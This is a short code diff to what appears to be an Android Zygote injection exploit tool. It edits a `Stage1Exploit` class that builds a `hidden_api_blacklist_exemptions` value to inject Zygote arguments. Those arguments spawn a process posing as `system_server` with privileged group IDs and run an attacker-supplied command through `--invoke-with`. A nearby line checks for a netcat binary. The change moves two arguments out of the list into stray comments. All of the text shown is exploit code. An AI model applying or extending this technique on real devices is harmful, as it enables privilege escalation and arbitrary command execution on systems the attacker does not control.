@@ -179,6 +179,10 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
+           # "--target-sdk-version=28",
+    
+           # "--seinfo=platform:system_server:complete",
+
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
@@ -192,8 +196,6 @@ class Stage1Exploit:
             "--setgroups=1002,1005,1007,1016,1023,1024,1065,2001,3001,3002,3003,3005,3006,3007,3009,3010,3011",
             "--runtime-args",
             "--nice-name=system_server",
-            "--target-sdk-version=28",
-            "--seinfo=platform:system_server:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
